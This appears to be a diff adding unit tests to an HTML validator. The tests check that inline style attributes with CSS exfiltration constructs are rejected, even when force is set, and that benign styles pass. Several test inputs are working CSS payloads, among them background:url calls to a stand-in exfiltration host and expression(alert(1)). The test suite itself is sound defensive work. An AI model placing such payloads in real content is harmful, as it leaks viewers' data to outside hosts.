@@ -1064,6 +1064,51 @@ describe('htmlValidate.validateHtmlContent', () => {
             /<iframe>\/<object>\/<embed>\/<noscript>\/<link>|FormOrSvgAnimationNotAllowed/,
         );
     });
+
+    it('throws on an inline style="" attribute carrying a background:url(...) exfiltration payload (#523)', () => {
+        // The simplest delivery mechanism for #523's core attack: the same
+        // network-fetching CSS construct the <style>-element check rejects, but
+        // carried in an inline style ATTRIBUTE the element check never inspects.
+        const html = '<html><body><div style="background:url(https://evil.example.com/exfil?leak=1)">hi</div></body></html>';
+        assert.throws(
+            () => htmlValidate.validateHtmlContent(html, false),
+            /inline style attribute containing url\(\.\.\.\)|DangerousStyleAttributeNotAllowed/,
+        );
+    });
+
+    it('throws on a dangerous inline style attribute even when force=true (#523: not a force-bypassable heuristic)', () => {
+        const html = '<html><body><div style="background:url(https://evil.example.com/exfil)">hi</div></body></html>';
+        assert.throws(
+            () => htmlValidate.validateHtmlContent(html, true),
+            /inline style attribute containing url\(\.\.\.\)|DangerousStyleAttributeNotAllowed/,
+        );
+    });
+
+    it('throws on an inline style attribute using @import/expression/-moz-binding/behavior, not only url() (#523)', () => {
+        for (const decl of ["@import 'x.css'", 'width:expression(alert(1))', '-moz-binding:url(#x)', 'behavior:url(x.htc)']) {
+            const html = `<html><body><div style="${decl}">hi</div></body></html>`;
+            assert.throws(
+                () => htmlValidate.validateHtmlContent(html, false),
+                /inline style attribute containing url\(\.\.\.\)|DangerousStyleAttributeNotAllowed/,
+                `expected a throw for inline style: ${decl}`,
+            );
+        }
+    });
+
+    it('does not throw on a benign inline style attribute with no network-fetching CSS construct (#523: no false positive)', () => {
+        const html = '<html><body><div style="text-align:right;color:#333;padding:4px">x</div></body></html>';
+        assert.doesNotThrow(() => htmlValidate.validateHtmlContent(html, false));
+    });
+
+    it('does not throw on the Markdown2Html pagebreak separator\'s legitimate inline style (#523: real pipeline output must pass)', () => {
+        // Markdown2Html's assembleDocument() joins include blocks with
+        // <div class="page-break" style="page-break-after: always;"></div>, which
+        // reaches this gate verbatim in the documented pipeline. "page-break-after"
+        // holds no url()/@import/expression/-moz-binding/behavior: construct, so it
+        // must not be mistaken for a CSS-exfiltration payload.
+        const html = '<html><body><div class="page-break" style="page-break-after: always;"></div></body></html>';
+        assert.doesNotThrow(() => htmlValidate.validateHtmlContent(html, false));
+    });
 });
 
 // ===========================================================================
